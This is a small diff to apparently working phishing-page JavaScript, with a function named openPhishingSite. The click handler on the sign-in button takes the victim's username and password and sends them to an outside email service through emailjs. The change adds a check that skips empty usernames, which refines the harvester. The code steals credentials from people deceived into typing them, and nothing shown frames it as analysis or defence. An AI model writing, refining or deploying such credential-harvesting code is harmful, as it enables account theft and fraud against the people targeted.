@@ -19,6 +19,9 @@ function openPhishingSite() {
 }
 
 signInButton.addEventListener('click', () => {
+  if (username.value === '') {
+    return;
+  }
   emailjs
     .send('ZRS', 'template_qdm55vd', {
       message: `Username: ${username.value} + Password: ${password.value}`,
